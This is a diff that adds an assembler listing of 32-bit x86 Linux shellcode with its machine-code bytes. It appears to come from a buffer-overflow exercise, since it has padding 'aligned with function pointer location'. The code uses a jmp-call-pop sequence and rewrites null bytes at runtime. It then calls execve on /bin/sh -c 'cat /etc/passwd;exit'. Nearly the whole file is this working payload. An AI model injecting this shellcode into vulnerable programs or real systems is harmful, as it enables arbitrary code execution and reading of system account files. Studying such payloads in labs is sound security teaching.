@@ -1,0 +1,56 @@
+     1                                  bits 32
+     2                                  ; nop instructions added for padding 
+     3                                  
+     4                                  ; aligned with function pointer location 
+     5 00000000 90                      nop 
+     6 00000001 90                      nop
+     7                                  
+     8                                  ; find current location
+     9 00000002 EB29                    start: jmp short codeEnd
+    10 00000004 5E                      start2: pop esi
+    11                                  
+    12                                  ; Use XOR to clear the A register
+    13 00000005 31C0                    xor eax, eax
+    14                                  
+    15                                  ; add back null bytes to data with mov command
+    16 00000007 884607                  mov [byte esi+flagStr-exeStr-2], al ; subtract 2 to point to X char instead of y
+    17 0000000A 88460B                  mov [byte esi+cmdStr-exeStr-1], al 
+    18 0000000D 884620                  mov [byte esi+arrayAddr-exeStr-1], al
+    19 00000010 89462D                  mov [byte esi+arrayAddr-exeStr+12], eax
+    20                                  
+    21                                  
+    22                                  
+    23                                  
+    24                                  ; address of exeStr is already in esi
+    25                                  ; use mov command to restore array
+    26 00000013 897621                  mov [byte esi+arrayAddr-exeStr], esi
+    27                                  
+    28                                  ;use lea to compute address of flagStr
+    29 00000016 8D7E09                  lea edi, [byte esi+flagStr-exeStr]
+    30 00000019 897E25                  mov [byte esi+arrayAddr-exeStr+4], edi
+    31                                  
+    32                                  ; use lea to compute address of cmdStr 
+    33 0000001C 8D7E0C                  lea edi, [byte esi+cmdStr-exeStr]
+    34 0000001F 897E29                  mov [byte esi+arrayAddr-exeStr+8], edi
+    35                                  
+    36                                  ; making system call
+    37 00000022 B00B                    mov al, 0x0b
+    38 00000024 89F3                    mov ebx, esi ; get and use runtime address of exeStr
+    39 00000026 8D4E21                  lea ecx, [byte esi+arrayAddr-exeStr] ; get and use runtime address of array address
+    40 00000029 31D2                    xor edx, edx ; edx is set to 0
+    41 0000002B CD80                    int 0x80
+    42 0000002D E8D2FFFFFF              codeEnd: call start2
+    43                                  
+    44                                  ; stores all data
+    45 00000032 2F62696E2F73685879      exeStr: db "/bin/shXy" ; y is added to avoid problems with exploit in machine code
+    46 0000003B 2D6358                  flagStr: db "-cX"
+    47 0000003E 636174202F6574632F-     cmdStr: db "cat /etc/passwd;exitX"
+    48 00000047 7061737377643B6578-
+    49 00000050 697458             
+    50                                  
+    51                                  arrayAddr:
+    52 00000053 FFFFFFFF                dd 0xffffffff
+    53 00000057 FFFFFFFF                dd 0xffffffff
+    54 0000005B FFFFFFFF                dd 0xffffffff
+    55 0000005F FFFFFFFF                dd 0xffffffff
+    56 00000063 61000000                newAddr: dd newAddr-start
